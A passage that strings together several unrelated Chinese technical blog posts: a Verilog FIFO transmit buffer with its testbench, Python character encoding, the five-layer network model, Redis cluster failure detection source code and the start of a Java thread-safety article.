 17     input                         user_clk,
 18     input         [DATA_W-1:0]     din,
 19     input                         din_vld,
 20     input                         din_sop,
 21     input                         din_eop,
 22     input         [2-1:0]         din_mod,
 23     output                         rdy,
 24 
 25     //MAC侧信号
 26     input                         eth_tx_clk,
 27     output reg     [8-1:0]         dout,
 28     output reg                     dout_sop,
 29     output reg                     dout_eop,
 30     output reg                     dout_vld
 31     );
 32 
 33 
 34     reg wr_en = 0;
 35     reg [DATA_W+4-1:0] fifo_din = 0;
 36     reg [ (2-1):0]  rd_cnt = 0     ;
 37     wire        add_rd_cnt ;
 38     wire        end_rd_cnt ;
 39     wire rd_en;
 40     wire [DATA_W+4-1:0] fifo_dout;
 41     wire rst;
 42     reg [ (2-1):0]  rst_cnt =0    ;
 43     wire        add_rst_cnt ;
 44     wire        end_rst_cnt ;
 45     reg rst_flag = 0;
 46     wire [11 : 0] wr_data_count;
 47     wire empty;
 48     wire full;
 49 
 50 /****************************************写侧*************************************************/
 51 always  @(posedge user_clk or negedge rst_n)begin
 52     if(rst_n==1'b0)begin
 53         wr_en <= 0;
 54     end
 55     else if(rdy)
 56         wr_en <= din_vld;
 57 end
 58 
 59 always  @(posedge user_clk or negedge rst_n)begin
 60     if(rst_n==1'b0)begin
 61         fifo_din <= 0; 
 62     end
 63     else begin//[35] din_sop    [34] din_eop    [33:32] din_mod    [31:0] din
 64         fifo_din <= {din_sop,din_eop,din_mod,din};
 65     end
 66 end
 67 
 68 assign rdy = wr_data_count <= 1516 && !rst && !rst_flag && !full;
 69 
 70 /****************************************读侧*************************************************/
 71 
 72 always @(posedge eth_tx_clk or negedge rst_n) begin 
 73     if (rst_n==0) begin
 74         rd_cnt <= 0; 
 75     end
 76     else if(add_rd_cnt) begin
 77         if(end_rd_cnt)
 78             rd_cnt <= 0; 
 79         else
 80             rd_cnt <= rd_cnt+1 ;
 81    end
 82 end
 83 assign add_rd_cnt = (!empty);
 84 assign end_rd_cnt = add_rd_cnt  && rd_cnt == (4)-1 ;
 85 
 86 assign rd_en = end_rd_cnt;
 87 
 88 always  @(posedge eth_tx_clk or negedge rst_n)begin
 89     if(rst_n==1'b0)begin
 90         dout <= 0;
 91     end
 92     else if(add_rd_cnt)begin
 93         dout <= fifo_dout[DATA_W-1-rd_cnt*8 -:8];
 94     end
 95 end
 96 
 97 always  @(posedge eth_tx_clk or negedge rst_n)begin
 98     if(rst_n==1'b0)begin
 99         dout_vld <= 0;
100     end
101     else if(add_rd_cnt && ((rd_cnt <= 3 - fifo_dout[33:32] && fifo_dout[34]) || !fifo_dout[34]))begin
102         dout_vld <= 1;
103     end
104     else
105         dout_vld <= 0;
106 end
107 
108 always  @(posedge eth_tx_clk or negedge rst_n)begin
109     if(rst_n==1'b0)begin
110         dout_sop <= 0;
111     end
112     else if(add_rd_cnt && rd_cnt == 0 && fifo_dout[35])begin
113         dout_sop <= 1;
114     end
115     else
116         dout_sop <= 0 ;
117 end
118 
119 always  @(posedge eth_tx_clk or negedge rst_n)begin
120     if(rst_n==1'b0)begin
121         dout_eop <= 0;
122     end
123     else if(add_rd_cnt && rd_cnt == 3 - fifo_dout[33:32] && fifo_dout[34])begin
124         dout_eop <= 1;
125     end
126     else
127         dout_eop <= 0;
128 end
129 
130 
131 /******************************FIFO复位逻辑****************************************/
132 assign rst = !rst_n || rst_flag;
133 
134 always  @(posedge user_clk or negedge rst_n)begin 
135     if(!rst_n)begin
136         rst_flag <= 1;
137     end
138     else if(end_rst_cnt)
139         rst_flag <= 0;
140 end
141 
142 always @(posedge user_clk or negedge rst_n) begin 
143     if (rst_n==0) begin
144         rst_cnt <= 0; 
145     end
146     else if(add_rst_cnt) begin
147         if(end_rst_cnt)
148             rst_cnt <= 0; 
149         else
150             rst_cnt <= rst_cnt+1 ;
151    end
152 end
153 assign add_rst_cnt = (rst_flag);
154 assign end_rst_cnt = add_rst_cnt  && rst_cnt == (3)-1 ;
155 
156 
157 
158     //FIFO位宽32bit 一帧数据最长1514byte，即379个16bit数据
159     //FIFO深度：379*4 = 1516  需要2048
160     //异步FIFO例化
161     fifo_generator_0 fifo (
162   .rst(rst),        // input wire rst
163   .wr_clk(user_clk),  // input wire wr_clk   100MHZ
164   .rd_clk(eth_tx_clk),  // input wire rd_clk  125MHZ
165   .din(fifo_din),        // input wire [33 : 0] din
166   .wr_en(wr_en),    // input wire wr_en
167   .rd_en(rd_en),    // input wire rd_en
168   .dout(fifo_dout),      // output wire [33 : 0] dout
169   .full(full),      // output wire full
170   .empty(empty),    // output wire empty
171   .wr_data_count(wr_data_count)  // output wire [11 : 0] wr_data_count
172 );
173 
174 endmodule

tx_buffer
　　接下来是验证部分，也就是本文的重点。以下的testbench包含了最基本的测试思想：发送测试激励给UUT，将UUT输出与黄金参考值进行比较，通过记分牌输出比较结果。


  1 `timescale 1ns / 1ps
  2 
  3 module tx_buffer_tb( );
  4 
  5 parameter USER_CLK_CYC = 10,
  6           ETH_CLK_CYC = 8,
  7           RST_TIM = 3;
  8           
  9 parameter SIM_TIM = 10_000;
 10 
 11 reg user_clk;
 12 reg rst_n;
 13 reg [32-1:0] din;
 14 reg din_vld,din_sop,din_eop;
 15 reg [2-1:0] din_mod;
 16 wire rdy;
 17 reg eth_tx_clk;
 18 wire [8-1:0] dout;
 19 wire dout_sop,dout_eop,dout_vld;
 20 reg [8-1:0] dout_buf [0:1024-1];
 21 reg [16-1:0] len [0:100-1];
 22 reg [2-1:0] mod [0:100-1];
 23 reg err_flag = 0;
 24 
 25 tx_buffer#(.DATA_W(32))//位宽不能改动
 26 dut
 27 (
 28     
 29     //全局信号
 30    .rst_n      (rst_n) ,//保证拉低三个时钟周期，否则FIF可能不会正确复位
 31    .user_clk   (user_clk) ,
 32    .din        (din) ,
 33    .din_vld    (din_vld) ,
 34    .din_sop    (din_sop) ,
 35    .din_eop    (din_eop) ,
 36    .din_mod    (din_mod) ,
 37    .rdy        (rdy) ,
 38    .eth_tx_clk (eth_tx_clk) ,
 39    .dout       (dout) ,
 40    .dout_sop   (dout_sop) ,
 41    .dout_eop   (dout_eop) ,
 42    .dout_vld   (dout_vld) 
 43     );
 44     
 45 /***********************************时钟******************************************/
 46     initial begin
 47         user_clk = 1;
 48         forever #(USER_CLK_CYC/2) user_clk = ~user_clk;
 49     end
 50 
 51     initial begin
 52         eth_tx_clk = 1;
 53         forever #(ETH_CLK_CYC/2) eth_tx_clk = ~eth_tx_clk;
 54     end
 55 /***********************************复位逻辑******************************************/
 56     initial begin
 57         rst_n = 1;
 58         #1;
 59         rst_n = 0;
 60         #(RST_TIM*USER_CLK_CYC);
 61         rst_n = 1;
 62     end
 63     
 64 /***********************************输入激励******************************************/
 65 integer gen_time = 0;
 66     initial begin
 67         #1;
 68         packet_initial;
 69         #(RST_TIM*USER_CLK_CYC);
 70         packet_gen(20,2);
 71         #(USER_CLK_CYC*10);
 72         packet_gen(30,1);
 73     end
 74     
 75 /***********************************输出缓存与检测******************************************/    
 76 integer j = 0;
 77 integer chk_time = 0;
 78     initial begin
 79         forever begin
 80             @(posedge eth_tx_clk)
 81             if(dout_vld)begin    
 82                 if(dout_sop)begin
 83                     dout_buf[0] = dout;
 84                     j = 1;
 85                 end
 86                 else if(dout_eop)begin
 87                     dout_buf[j] = dout;
 88                     j = j+1;
 89                     packet_check;
 90                 end
 91                 else begin
 92                     dout_buf[j] = dout;
 93                     j = j+1;
 94                 end
 95             end
 96         end
 97     end
 98     
 99 /***********************************score board******************************************/
100 integer fid;
101     initial begin
102         fid = $fopen("test.txt");
103         $fdisplay(fid,"                 Start testing                      \n");
104         #SIM_TIM;
105         if(err_flag)
106             $fdisplay(fid,"Check is failed\n");
107         else
108             $fdisplay(fid,"Check is successful\n");
109         $fdisplay(fid,"                 Testing is finished                \n");
110         $fclose(fid);
111         $stop;
112     end
113 
114 /***********************************子任务******************************************/    
115 //包生成子任务
116     task packet_gen;
117         input [16-1:0] length;
118         input [2-1:0] invalid_byte;
119         integer i;
120         begin
121             len[gen_time] = length;
122             mod[gen_time] = invalid_byte;
123             
124             for(i = 1;i<=length;i=i+1)begin
125                 if(rdy == 1)begin
126                     din_vld = 1;
127                     if(i==1)
128                         din_sop = 1;
129                     else if(i == length)begin
130                         din_eop = 1;
131                         din_mod = invalid_byte;
132                     end
133                     else begin
134                         din_sop = 0;
135                         din_eop = 0;
136                         din_mod = 0;
137                     end
138                     din = i ;
139                 end
140                 
141                 else begin
142                     din_sop = din_sop;
143                     din_eop = din_eop;
144                     din_vld = 0;
145                     din_mod = din_mod;
146                     din = din;
147                     i = i - 1;
148                 end
149                 
150                 #(USER_CLK_CYC*1);
151             end
152             packet_initial;
153             gen_time = gen_time + 1;
154         end
155     endtask
156     
157     task packet_initial;
158         begin
159             din_sop = 0;
160             din_eop = 0;
161             din_vld = 0;
162             din = 0;
163             din_mod = 0;
164         end
165     endtask
166 
167 //包检测子任务
168     task packet_check;
169         integer k;
170         integer num,packet_len;
171         begin
172             num = 1;
173             $fdisplay(fid,"%dth:Packet checking...\n",chk_time);
174             packet_len = 4*len[chk_time]-mod[chk_time];
175             if(j != packet_len)begin
176                 $fdisplay(fid,"Length of the packet is wrong.\n");
177                 err_flag = 1;
178                 disable packet_check;
179             end
180             
181             for(k=0;k<packet_len;k=k+1)begin
182                 if(k%4 == 3)begin
183                     if(dout_buf[k] != num)begin 
184                         $fdisplay(fid,"Data of the packet is wrong!\n");
185                         err_flag = 1;
186                     end
187                     num = num+1;
188                 end    
189                 else if(dout_buf[k] != 0)begin
190                     $fdisplay(fid,"Data of the packet is wrong,it should be zero!\n");
191                     err_flag = 1;
192                 end
193             end
194             chk_time = chk_time + 1;
195         end
196     endtask
197     
198 endmodule

tx_buffer_tb
　　可见主要是task编写及文件读写操作帮了大忙，如果都用眼睛看波形来验证设计正确性，真的是要搞到眼瞎。为保证测试完备性，测试包生成task可通过输入接口产生不同长度和无效字节数的递增数据包。testbench中每检测到输出包尾指示信号eop即调用packet_check task对数值进行检测。本文的testbench结构较具通用性，可以用来验证任意对数据包进行处理的逻辑单元。
　　之前Modelsim独立仿真带有IP核的Vivado工程时经常报错，只好使用Vivado自带的仿真工具。一直很头痛这个问题，这次终于有了进展！首先按照常规流程使用Vivado调用Modelsim进行行为仿真，启动后会在工程目录下产生些有用的文件，帮助我们脱离Vivado进行独立仿真。

　　在新建Modelsim工程时，在红框内选择Vivado工程中<project>.sim -> sim_1 -> behav下的modelsim.ini文件。之后添加文件包括：待测试设计文件、testbench以及IP核可综合文件。第三个文件在<project>.srcs -> sources_1 -> ip -> <ip_name> -> synth下。

　　现在可以顺利启动仿真了。我们来看下仿真结果：



　　文件中信息打印情况：

　　从波形和打印信息的结果来看，基本可以证明数据缓存及位宽转换模块逻辑功能无误。为充分验证要进一步给出覆盖率较高的测试数据集，后期通过编写do文件批量仿真实现。在FPGA或IC设计中，验证占据大半开发周期，可见VerilogHDL的非综合子集也是至关重要的，今后会多总结高效的验证方法！
********************************************************************************************************************************************************************************************************
第7天字符编码
什么是字符编码？
　　计算机只能识别0和1，当我们与计算机进行交互的时候不可能通过0和1进行交互，因此我们需要一张表把我们人类的语言一一对应成计算机能够识别的语言，这张表就是我们通常所说的字符编码表。因为计算机是美国人发明的，在设计之初的时候并未考虑到全世界的情况，所以最开始只有一张ASCII表（这个表只是英文和计算机识别语言的一一对应），随着计算机的普及，为了使用计算机，各国陆陆续续的又出现了很多自己国家的字符编码表，但是这样就造成了另外一种现象，就是乱码。当中国使用外国的软件的时候，由于编码表不一样的问题导致无法解码出正确的字符，从而出现乱码。为了解决这样的问题，出现了一个叫做unicode的万国码，把世界上所有的语言通过这一张表一一映射，这样乱码的问题就解决了。但是unicode由于所占字节过大，为了节省空间从而达到减少IO操作时间的目的，又出现了一种变长编码方式utf-8（unicode transform format）,它只是unicode的一种转换格式，和世界上其他的语言没有一一对应关系，目前现状来看，计算机内存中使用的编码方式是unicode。所以在我们进行编码和解码的过程中，如果出现了各国语言不一致的问题，我们需要通过unicode进行转换。
目前有的字符编码

软件执行文件的三步骤，python解释器也一样

文件存入硬盘的过程（nodpad++为例）
结论：存文件的过程中不能出错，一旦存错就算是相同的编码方式也是解码不了的。
第一步：打开软件，也就是操作系统把软件添加到内存中
第二步：输入内容，此时所有的内容都是存在内存中的（先更改字符编码集，然后在写入内容），当我们编码改成日文的时候会发现目前我们依然能够看到是不乱码的，那是因为在内存中都是以unicode的形式编码的，无论是哪一国的语言都是可以显示的。

第三步：点击保存按钮，把内容保存在硬盘上面
第四步：以同样的编码方式重新打开的时候发现中文出现乱码

 
python读取文件的三个步骤
第一步：打开python解释器，加载到内存，没有实际文件的编码和解码过程
第二步：python当作一个文本编辑器去从硬盘中加载文件到内存，此时不会关注语法，但是有解码的过程。因此当初存文件的时候的编码和解码是否一样决定是否会报错。

python2默认编码方式为ASCII
python3默认编码方式为utf-8

左边是一个以gbk的方式存储的文件，右边通过python3和python2分别去执行文件都会报错，这个是在第二步读取文件就会出现的错误，因为python2和python3默认编码方式都不是gbk，因此在加载到内存这一步就出现了错误

在前面加上了一行字符，表示告诉解释器当在读取文件的时候应该用哪中编码方式，这样在加载到内存这一步就不会出错了。报错的原因并不是字符编码的问题，而是程序的语法问题，也就是第三步了。
 
当前两步执行完成之后，文件中的内容就以unicode的方式存在了内存中。
接下来开始执行第三部，也就是python语法的检测（在这一步的处理python2和python3是不一样的）：
　　为什么python2和python3在这一步不一样呢？代码存在与内存中是要存两份的，第一份就是在第二步（在未执行代码之前）从文件中读取出来的代码是以unicode的方式存在于内存中的，第二份就是在代码的执行过程中会对字符串重新申请一份内存空间，而这份内存空间是以什么样的编码方式存储的是与python的解释器有关系的！
print函数
print函数打印的时候默认是以终端的编码格式打印的！
python3
当python3读到   s = '你瞅啥'   会重新申请一份内存空间然后把   ‘你瞅啥’   以unicode的方式存储起来。（所以说无论终端是以什么样的编码格式打印的都是不会出现乱码的）

# 下面这段代码无论放在哪里都是可以执行出来结果的，因为内存中的都是unicode编码
#_*_coding:gbk_*_
s = '你愁啥'
print(s, type(s))


#_*_coding:gbk_*_
s = '你愁啥'
print(s, type(s))
#s可以直接encode成任意编码格式
print(s.encode('gbk')) 
print(type(s.encode('gbk'))) #<class 'bytes'>

python2
当python2读到   s = '你瞅啥'   默认会重新申请一份内存空间然后把   ‘你瞅啥’   以最上面一行的编码方式存储

# 如果是python2运行此代码，当运行到s = '你瞅啥' 的时候会新开辟一个内存空间以gbk的格式存进去# 所以打印终端必须是gbk，否则会出现错误
#_*_coding:gbk_*_
s = '你愁啥'
print(s, type(s))


# 如果是python2的话一般会在字符串前面加上u，直接把字符串解码成unicode格式

#_*_coding:gbk_*_
s = u'你愁啥'  # 相当于执行了 s = '你瞅啥'.decode('gbk')
print(s, type(s))

 
 
例一：

# 当前所在环境为pycharm + python3.6

a = '中国万岁'
print(a)
# 执行这个文件的时候
# 首先python解释器会以默认的编码方式(utf-8)把文件从硬盘中读取到内存中
# 此时的代码块都是以unicode的形式存在于内存中的

# 然后执行这个文件的时候，读到a = '中国万岁'这一句的时候会新开辟一个内存空间
# 同样以unicode的编码方式来存放'中国万岁'这四个字

# 当读到print(a)的时候需要打印a，因此会以当前终端的编码方式去编码a也就是'中国万岁'
# 四个字，实际上也就是把unicode ===编码=》utf-8然后显示出来

 
********************************************************************************************************************************************************************************************************
通俗讲解计算机网络五层协议
=========================================================================================
    在我看来，学习java最重要是要理解what(这东西是什么)，why(为什么要用它)，where(在哪用它)，how(怎么用)。所以接下来，我都是以这样的思想来和大家交流，从最基础的知识讲起。如果有啥出错的，欢迎大家前来批评。本人虚心接纳。
=========================================================================================
      我们需要了解一下JavaWeb是怎样运行的？一个Web项目运行的原理是基于计算机网络的知识，总的大概过程如下。
      首先在在浏览器中输入要访问的网址，回车后浏览器向web服务器发送一个HTTP请求；根据计算机网络知识，两台电脑的访问中间需要经过五层协议，包括物理层，数据链路层，网络层，运输层，应用层。下面通俗说一下五个层次，以发送方和接收方为例子。
     1.应用层：应用层是整个层次最顶层，直接和最原始数据打交道，定义的是应用进程间通信和交互的规则。这是什么意思？因为两台电脑通讯就是发送方把数据传给接收方，虽然发送方知道自己发送的是什么东西、转化成字节数组之后有多长，但接收方肯定不知道，所以应用层的网络协议诞生了，他规定发送方和接收方必须使用一个固定长度的消息头，消息头必须使用某种固定的组成，而且消息头里必须记录消息体的长度等一系列信息，以方便接收方能够正确的解析发送方发送的数据。如果没有应用层的规则，那么接收方拿到数据后也是不知所措，就如同拿到一个没有说明书的工具无法操作。
     2.运输层：负责向两个主机中进程之间的通信提供通用数据服务，“传输层”的功能，就是建立”端口到端口”的通信。例如，同一台主机上有许多程序都需要用到网络，假设你一边在看网页，一边上QQ聊天。当一个数据包从互联网上发来的时候，你怎么知道，它是表示网页的内容，还是表示QQ聊天的内容？也就是说，我们还需要一个参数，表示这个数据包到底供哪个程序（进程）使用。这个参数就叫做”端口”（port），它其实是每一个使用网卡的程序的编号。每个数据包都发到主机的特定端口，所以不同的程序就能取到自己所需要的数据。“端口”是0到65535之间的一个整数，正好16个二进制位。0到1023的端口被系统占用，用户只能选用大于1023的端口。不管是浏览网页还是在线聊天，应用程序会随机选用一个端口，然后与服务器的相应端口联系。
     3.网络层：”网络层”的功能是建立”主机到主机”的通信。通过网络层我们能找到其他一台电脑的所在位置并进行主机到主机连接。每台计算机有了两种地址，一种是MAC地址，另一种是网络地址。两种地址之间没有任何联系，MAC地址是绑定在网卡上的，网络地址则是管理员分配的，它们只是随机组合在一起。网络地址帮助我们确定计算机所在的子网络，MAC地址则将数据包送到该子网络中的目标网卡。
     4.数据链路层：两个相邻节点之间传送数据时，数据链路层将网络层交下来的IP数据报组装成帧，在两个相邻的链路上传送帧（frame)。由于网络层移交的ip数据包数据可能会很多，所以要进行分组封装成帧，每一帧包括数据和必要的控制信息。其实就是解读电信号，进行分组。封装成帧，透明传输，差错控制。
     5.物理层：电脑要组网，第一件事要干什么？当然是先把电脑连起来，可以用光缆、电缆、双绞线、无线电波等方式，它就是把电脑连接起来的物理手段，它主要规定了网络的一些电气特性，将本电脑要传输的数据帧变成010101的比特流，发送出去，作用是负责传送0和1的电信号。
     这里举个例子来说明下，比如A与B要通讯，A向B请求发送了一份数据。首先A在请求链接里面可以获取到B的地址，要发送的这份数据首先经过应用层，制定了一系列规则，比如数据的格式怎样，长度多少，以方便接收方能够正确的解析发送方发送的数据；接下来进入运输层，把进程端口封装在数据包，这样才知道是A当前电脑哪个进程发的数据包；再接下是进入网络层，通过ip地址找到B主机所在位置并进行相连；然后进入数据链路层，将ip数据包封装成帧；最后进入物理层，进行数据帧转换成比特流0或1,通过硬件光纤进行传输；这一整套是A的通讯过程，对于·B而言就是相反的过程。
 
===========================================================================
                                用心查阅，有心分享，分享之际，互相指教，受益你我，何乐不为？
 ===========================================================================
********************************************************************************************************************************************************************************************************
Redis源码阅读（五）集群-故障迁移（上）
　　　　　　　　Redis源码阅读（五）集群-故障迁移（上）
　　故障迁移是集群非常重要的功能；直白的说就是在集群中部分节点失效时，能将失效节点负责的键值对迁移到其他节点上，从而保证整个集群系统在部分节点失效后没有丢失数据，仍能正常提供服务。这里先抛开Redis实际的做法，我们可以自己想下对于Redis集群应该怎么做故障迁移，哪些关键点是必须要实现的。然后再去看Redis源码中具体的实现，是否覆盖了我们想到的关键点，有哪些设计是我们没有想到的，这样看代码的效果会比较好。
　　我在思考故障迁移这个功能时，首先想到的是节点发生故障时要很快被集群中其他节点发现，尽量缩短集群不可用的时间；其次就是要选出失效节点上的数据可以被迁移到哪个节点上；在选择迁移节点时最好能够考虑节点的负载，避免迁移造成部分节点负载过高。另外，失效节点的数据在其失效前就应该实时的复制到其他节点上，因为一般情况下节点失效有很大概率是机器不可用，如果没有事先执行过数据复制，节点数据就丢失了。最后，就是迁移的执行，除了要将失效节点原有的键值对数据迁移到其他节点上，还要将失效节点原来负责的槽也迁移到其他节点上，而且槽和键值对应该同步迁移，要避免槽被分配到节点A而槽所对应的键值对被分配到节点B的情况。
　　总结起来有实现集群故障迁移要实现下面关键点：
　　1. 节点失效事件能被集群系统很快的发现
　　2. 迁移时要能选择合适的节点
　　3. 节点数据需要实时复制，在失效后可以直接使用复制的数据进行迁移
　　4. 迁移要注意将槽和键值对同步迁移
　　看过Redis源码后，发现Redis的故障迁移也是以主备复制为基础的，也就是说需要给每个集群主节点配置从节点，这样主节点的数据天然就是实时复制的，在主节点出现故障时，直接在从节点中选择一个接替失效主节点，将该从节点升级为主节点并通知到集群中所有其他节点即可，这样就无需考虑上面提到的第三点和第四点。如果集群中有节点没有配置从节点，那么就不支持故障迁移。

 
故障检测
　　Redis的集群是无中心的，无法通过中心定时向各个节点发送心跳来判断节点是否故障。在Redis源码中故障的检测分三步：
1. 节点互发ping消息，将Ping超时的节点置为疑似下线节点
　　在这一步中，每个节点都会向其他节点发送Ping消息，来检测其他节点是否和自己的连接有异常。但要注意的是即便检测到了其他节点Ping消息超时，也不能简单的认为其他节点是失效的，因为有可能是这个节点自己的网络异常，无法和其他节点通信。所以在这一步只是将检测到超时的节点置为疑似下线。例如：节点A向节点B发送Ping发现超时，则A会将节点B的状态置为疑似下线并保存在自己记录的集群节点信息中，存储的疑似下线信息就是之前提过的clusterState.nodes里对应的失效节点的flags状态值。
　　// 默认节点超时时限
　　#define REDIS_CLUSTER_DEFAULT_NODE_TIMEOUT 15000
 2. 向其他节点共享疑似下线节点
　　在检测到某个节点为疑似下线之后，会将这个节点的疑似下线情况分享给集群中其他的节点，分享的方式也是通过互发Ping消息，在ping消息中会带上集群中随机的三个节点的状态，前面在分析集群初始化时，曾介绍过利用gossip协议扩散集群节点状态给整个集群，这里节点的疑似下线状态也是通过这种方式传播给其他节点的。每条ping消息会带最多三个随机节点的状态信息


void clusterSendPing(clusterLink *link, int type) { //随机算去本节点所在集群中的任意两个其他node节点(不包括link本节点和link对应的节点)信息发送给link对应的节点
    unsigned char buf[sizeof(clusterMsg)];
    clusterMsg *hdr = (clusterMsg*) buf;
    int gossipcount = 0, totlen;
    /* freshnodes is the number of nodes we can still use to populate the
     * gossip section of the ping packet. Basically we start with the nodes
     * we have in memory minus two (ourself and the node we are sending the
     * message to). Every time we add a node we decrement the counter, so when
     * it will drop to <= zero we know there is no more gossip info we can
     * send. */
    int freshnodes = dictSize(server.cluster->nodes)-2; //除去本节点和接收本ping信息的节点外，整个集群中有多少其他节点
   // 如果发送的信息是 PING ，那么更新最后一次发送 PING 命令的时间戳
    if (link->node && type == CLUSTERMSG_TYPE_PING)
        link->node->ping_sent = mstime();
   // 将当前节点的信息（比如名字、地址、端口号、负责处理的槽）记录到消息里面
    clusterBuildMessageHdr(hdr,type);
    /* Populate the gossip fields */
    // 从当前节点已知的节点中随机选出两个节点   
    // 并通过这条消息捎带给目标节点，从而实现 gossip 协议  
    // 每个节点有 freshnodes 次发送 gossip 信息的机会  
    // 每次向目标节点发送 3 个被选中节点的 gossip 信息（gossipcount 计数）
    while(freshnodes > 0 && gossipcount < 3) {
        // 从 nodes 字典中随机选出一个节点（被选中节点）
        dictEntry *de = dictGetRandomKey(server.cluster->nodes);
        clusterNode *this = dictGetVal(de);

        clusterMsgDataGossip *gossip; ////ping  pong meet消息体部分用该结构
        int j;

        if (this == myself ||
            this->flags & (REDIS_NODE_HANDSHAKE|REDIS_NODE_NOADDR) ||
            (this->link == NULL && this->numslots == 0))
        {
                freshnodes--; /* otherwise we may loop forever. */
                continue;
        }

        /* Check if we already added this node */
         // 检查被选中节点是否已经在 hdr->data.ping.gossip 数组里面       
         // 如果是的话说明这个节点之前已经被选中了   
         // 不要再选中它（否则就会出现重复）
        for (j = 0; j < gossipcount; j++) {  //这里是避免前面随机选择clusterNode的时候重复选择相同的节点
            if (memcmp(hdr->data.ping.gossip[j].nodename,this->name,
                    REDIS_CLUSTER_NAMELEN) == 0) break;
        }
        if (j != gossipcount) continue;
        /* Add it */
        // 这个被选中节点有效，计数器减一
        freshnodes--;
        // 指向 gossip 信息结构
        gossip = &(hdr->data.ping.gossip[gossipcount]);
        // 将被选中节点的名字记录到 gossip 信息    
        memcpy(gossip->nodename,this->name,REDIS_CLUSTER_NAMELEN);  
        // 将被选中节点的 PING 命令发送时间戳记录到 gossip 信息       
        gossip->ping_sent = htonl(this->ping_sent);      
        // 将被选中节点的 PING 命令回复的时间戳记录到 gossip 信息     
        gossip->pong_received = htonl(this->pong_received);   
        // 将被选中节点的 IP 记录到 gossip 信息       
        memcpy(gossip->ip,this->ip,sizeof(this->ip));    
        // 将被选中节点的端口号记录到 gossip 信息    
        gossip->port = htons(this->port);       
        // 将被选中节点的标识值记录到 gossip 信息   
        gossip->flags = htons(this->flags);       
        // 这个被选中节点有效，计数器增一
        gossipcount++;
    }
    // 计算信息长度    
    totlen = sizeof(clusterMsg)-sizeof(union clusterMsgData);  
    totlen += (sizeof(clusterMsgDataGossip)*gossipcount);    
    // 将被选中节点的数量（gossip 信息中包含了多少个节点的信息）   
    // 记录在 count 属性里面   
    hdr->count = htons(gossipcount);   
    // 将信息的长度记录到信息里面  
    hdr->totlen = htonl(totlen);   
    // 发送信息
    clusterSendMessage(link,buf,totlen);
}

　　收到ping消息的节点，如果发现ping消息中带的某个节点属于疑似下线状态，则找到自身记录该节点的ClusterNode结构，并向该结构的下线报告链表中插入一条上报记录，上报源头为发出Ping的节点。例如：节点A向节点C发送了ping消息， ping消息中带上B节点状态，并且B节点状态为疑似下线，那么C节点收到这个Ping消息之后，就会查找自身记录节点B的clusterNode，向这个clusterNode的fail_reports链表中插入来自A的下线报告。

3. 收到集群中超过半数的节点认为某节点处于疑似下线状态，则判定该节点下线，并广播
　　判定的时机是在每次收到一条ping消息的时候，当发现ping消息中带有某节点的疑似下线状态后，除了加入该节点的下线报告以外，还会调用markNodeAsFailingIfNeeded函数来尝试判断该节点是否已经被超过半数的节点判断为疑似下线，如果是的话，就将该节点状态置为下线，并调用clusterSendFail函数将下线状态广播给所有已知节点。这里广播不是通过订阅分发的方式，而是遍历所有节点，并给每个节点单独发送消息。


void clusterSendFail(char *nodename) { 
//如果超过一半的主节点认为该nodename节点下线了，则需要把该节点下线信息同步到整个cluster集群
    unsigned char buf[sizeof(clusterMsg)];
    clusterMsg *hdr = (clusterMsg*) buf;
     // 创建下线消息 
     clusterBuildMessageHdr(hdr,CLUSTERMSG_TYPE_FAIL); 
     // 记录命令 
     memcpy(hdr->data.fail.about.nodename,nodename,REDIS_CLUSTER_NAMELEN); 
     // 广播消息
    clusterBroadcastMessage(buf,ntohl(hdr->totlen));
}


void clusterBroadcastMessage(void *buf, size_t len) { //buf里面的内容为clusterMsg+clusterMsgData
    dictIterator *di;
    dictEntry *de;

     // 遍历所有已知节点
    di = dictGetSafeIterator(server.cluster->nodes);
    while((de = dictNext(di)) != NULL) {
        clusterNode *node = dictGetVal(de);

         // 不向未连接节点发送信息
        if (!node->link) continue;

         // 不向节点自身或者 HANDSHAKE 状态的节点发送信息
        if (node->flags & (REDIS_NODE_MYSELF|REDIS_NODE_HANDSHAKE))
            continue;

         // 发送信息
        clusterSendMessage(node->link,buf,len);
    }
    dictReleaseIterator(di);

　　从节点判断自己所属的主节点下线，则开始进入故障转移流程。如果主节点下只有一个从节点，那么很自然的可以直接进行切换，但如果主节点下的从节点不只一个，那么还需要选出一个新的主节点。这里的选举过程使用了比较经典的分布式一致性算法Raft，下一篇会介绍Redis中选举新主节点的过程。



********************************************************************************************************************************************************************************************************
线程安全
 线程安全
通过这篇博客你能学到什么:

编写线程安全的代码,本质上就管理状态的访问,而且通常是共享的、可变的状态.
状态:可以理解为对象的成员变量.
共享: 是指一个变量可以被多个线程访问
可变: 是指变量的值在生命周期内可以改变.
保证线程安全就是要在不可控制的并发访问中保护数据.
如果对象在多线程环境下无法保证线程安全,就会导致脏数据和其他不可预期的后果
在多线程编程中有一个原则:无论何时,只要有对于一个的线程访问给定的状态变量,而且其中某个线程会写入该变量,此时必须使用同步来协调线程对该变量的访问**
Java中使用synchronized(同步)来确保线程安全.在synchronized(同步)块中的代码,可以保证在多线程环境下的原子性和可见性.
不要忽略同步的重要性,如果程序中忽略了必要的同步,可能看上去是可以运行,但是它仍然存在隐患,随时都可能崩溃.
在没有正确同步的情况下,如果多线程访问了同一变量(并且有线程会修改变量,如果是只读,它还是线程安全的),你的程序就存在隐患,有三种方法修复它:1. 不要跨线程共享变量2. 使状态变为不可变的3. 在任何访问状态变量的时候使用同步
虽然可以用上述三类方法进行修改,但是会很麻烦、困难,所以一开始就将一个类设计成是线程安全的,比在后期重新修复它更容易
封装可以帮助你构建线程安全你的类,访问特定变量(状态)的代码越少,越容易确保使用恰当的同步,也越容易推断出访问一个变量所需的条件.总之,对程序的状态封装得越好,你的程序就越容易实现线程安全,同时有助于维护者保持这种线程安全性.
设计线程安全的类时,优秀的面向技术--封装、不可变性(final修饰的)以及明确的不变约束(可以理解为if-else)会给你提供诸多的帮助
虽然程序的响应速度很重要,但是正确性才是摆在首位的,你的程序跑的再快,结果是错的也没有任何意义,所以要先保证正确性然后再尝试去优化,这是一个很好的开发原则.
 
 1 什么是线程安全性
一个类是线程安全的,是指在被多个线程访问时,类可以持续进行正确的行为.
对于线程安全类的实例(对象)进行顺序或并发的一系列操作,都不会导致实例处于无效状态.
线程安全的类封装了任何必要的同步,因此客户不需要自己提供.
 
 
 2 一个无状态的(stateless)的servlet

public class StatelessServlet implements Servlet {

@Override
public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
BigInteger i = extractFromRequest(servletRequest);
BigInteger[] factors = factor(i);
encodeIntoResponse(servletResponse,factors);
}

}

 
 
